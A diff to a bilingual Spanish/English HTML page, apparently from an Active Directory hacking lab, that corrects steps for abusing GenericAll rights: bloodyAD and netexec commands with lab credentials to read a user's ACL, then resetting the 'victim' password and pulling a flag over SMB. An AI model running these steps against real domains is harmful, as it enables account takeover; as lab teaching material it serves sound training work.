@@ -27,13 +27,10 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} \
     <p><code>GenericAll</code> (control total) sobre un usuario permite, entre otras cosas, forzar el cambio de su contraseña sin conocer la anterior. BloodHound lo pinta como <strong>GenericAll → User</strong>.</p>
     <pre>export DC={{ ad_dc_ip }}
 
-# Con bloodyAD: ver quién tiene qué sobre m.davis
+# Con bloodyAD: ver quién tiene qué sobre m.davis (usa el sAMAccountName, no el nombre completo)
 bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
-  get object 'Michael Davis' --attr nTSecurityDescriptor
-
-# Con netexec: buscar derechos abusables de svc.readonly
-nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M daclread \
-  -o TARGET='m.davis' ACTION=read</pre>
+  get object m.davis --attr nTSecurityDescriptor</pre>
+    <p><strong>Nota sobre este Domain Controller:</strong> <code>nxc ldap -M daclread</code> no funciona contra este DC (falla el bind NTLM, ver AD 02) — usa <code>bloodyAD</code> como en el comando de arriba.</p>
 
     <h3>2 · Resetear la contraseña de la víctima</h3>
     <pre># bloodyAD (fija una contraseña conocida)
@@ -75,13 +72,10 @@ smbclient //$DC/hr_private -U '{{ ad_domain }}\m.davis%NewP@ss123!' -c 'get flag
     <p><code>GenericAll</code> (full control) over a user allows, among other things, forcing a password change without knowing the old one. BloodHound draws it as <strong>GenericAll → User</strong>.</p>
     <pre>export DC={{ ad_dc_ip }}
 
-# With bloodyAD: see who has what over m.davis
+# With bloodyAD: see who has what over m.davis (use the sAMAccountName, not the full name)
 bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
-  get object 'Michael Davis' --attr nTSecurityDescriptor
-
-# With netexec: hunt for svc.readonly's abusable rights
-nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M daclread \
-  -o TARGET='m.davis' ACTION=read</pre>
+  get object m.davis --attr nTSecurityDescriptor</pre>
+    <p><strong>Note about this Domain Controller:</strong> <code>nxc ldap -M daclread</code> does not work against this DC (the NTLM bind fails, see AD 02) — use <code>bloodyAD</code> as shown above.</p>
 
     <h3>2 · Reset the victim's password</h3>
     <pre># bloodyAD (set a known password)
